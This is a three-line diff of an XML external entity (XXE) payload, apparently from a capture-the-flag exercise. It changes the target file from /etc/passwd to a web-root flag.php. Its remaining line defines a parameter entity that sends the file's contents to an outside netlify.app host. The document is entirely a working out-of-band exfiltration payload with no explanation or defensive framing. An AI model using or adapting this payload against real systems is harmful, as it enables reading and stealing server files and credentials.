@@ -1,2 +1,2 @@
-<!ENTITY % d SYSTEM "file:///etc/passwd"> 
+<!ENTITY % d SYSTEM "file:///var/www/html/flag.php"> 
 <!ENTITY % c "<!ENTITY rrr SYSTEM 'https://loving-goldstine-95afaa.netlify.app/%d;'>">
